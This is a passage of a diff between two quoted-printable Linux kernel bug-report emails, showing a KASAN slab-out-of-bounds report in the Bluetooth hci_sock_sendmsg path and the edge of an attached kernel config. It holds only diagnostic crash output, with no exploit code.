+[   22.841301]  alloc_skb_with_frags+0x88/0x610
+[   22.841362]  sock_alloc_send_pskb+0x705/0x8a0
+[   22.841436]  hci_sock_sendmsg+0x162/0x2030
+[   22.841488]  __sys_sendto+0x40c/0x460
+[   22.841561]  __x64_sys_sendto+0xe5/0x1c0
+[   22.841632]  do_syscall_64+0xdd/0x4a0
+[   22.841692]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   22.841757]=20
+[   22.841815] The buggy address belongs to the object at ffff88800d985380
+[   22.841815]  which belongs to the cache skbuff_small_head of size 704
+[   22.841902] The buggy address is located 7 bytes to the right of
+[   22.841902]  allocated 704-byte region [ffff88800d985380, ffff88800d985640)
+[   22.841967]=20
+[   22.842041] The buggy address belongs to the physical page:
+[   22.842476] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
+ pfn:0xd984
+[   22.842803] head: order:2 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 p=
 incount:0
-[   22.523386] flags: 0x100000000000040(head|node=3D0|zone=3D1)
-[   22.523848] page_type: f5(slab)
-[   22.524200] raw: 0100000000000040 ffff88800aae3a00 dead000000000100 dead00=
-0000000122
-[   22.524269] raw: 0000000000000000 0000000200130013 00000000f5000000 000000=
+[   22.842887] flags: 0x100000000000040(head|node=3D0|zone=3D1)
+[   22.843384] page_type: f5(slab)
+[   22.843753] raw: 0100000000000040 ffff88800a9e0a00 dead000000000122 000000=
 0000000000
-[   22.524373] head: 0100000000000040 ffff88800aae3a00 dead000000000100 dead0=
-00000000122
-[   22.524434] head: 0000000000000000 0000000200130013 00000000f5000000 00000=
+[   22.843825] raw: 0000000000000000 0000000200130013 00000000f5000000 000000=
+0000000000
+[   22.843923] head: 0100000000000040 ffff88800a9e0a00 dead000000000122 00000=
 00000000000
-[   22.524490] head: 0100000000000002 ffffffffffffff01 00000000ffffffff 00000=
+[   22.843979] head: 0000000000000000 0000000200130013 00000000f5000000 00000=
+00000000000
+[   22.844033] head: 0100000000000002 ffffffffffffff01 00000000ffffffff 00000=
 000ffffffff
-[   22.524543] head: 0000000000000000 0000000000000000 00000000ffffffff 00000=
+[   22.844087] head: 0000000000000000 0000000000000000 00000000ffffffff 00000=
 00000000004
-[   22.524611] page dumped because: kasan: bad access detected
-[   22.524645]=20
-[   22.524665] Memory state around the buggy address:
-[   22.524908]  ffff88800e26a880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
+[   22.844160] page dumped because: kasan: bad access detected
+[   22.844193]=20
+[   22.844212] Memory state around the buggy address:
+[   22.844467]  ffff88800d985500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
 0 00
-[   22.524978]  ffff88800e26a900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
+[   22.844533]  ffff88800d985580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
 0 00
-[   22.525036] >ffff88800e26a980: 00 00 00 00 00 00 00 00 fc fc fc fc fc fc f=
+[   22.844592] >ffff88800d985600: 00 00 00 00 00 00 00 00 fc fc fc fc fc fc f=
 c fc
-[   22.525082]                                            ^
-[   22.525162]  ffff88800e26aa00: fc fc fc fc fc fc fc fc fa fb fb fb fb fb f=
+[   22.844640]                                            ^
+[   22.844721]  ffff88800d985680: fc fc fc fc fc fc fc fc fa fb fb fb fb fb f=
 b fb
-[   22.525202]  ffff88800e26aa80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb f=
+[   22.844762]  ffff88800d985700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb f=
 b fb
-[   22.525253] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+[   22.844815] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
 
---===============7278349626935829163==
+--===============5827465301887654440==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="config"
@@ -6360,4 +6370,4 @@ CONFIG_IO_URING_ZCRX=3Dy
 CONFIG_IO_URING_BPF=3Dy
 CONFIG_IO_URING_BPF_OPS=3Dy
 
---===============7278349626935829163==--
+--===============5827465301887654440==--
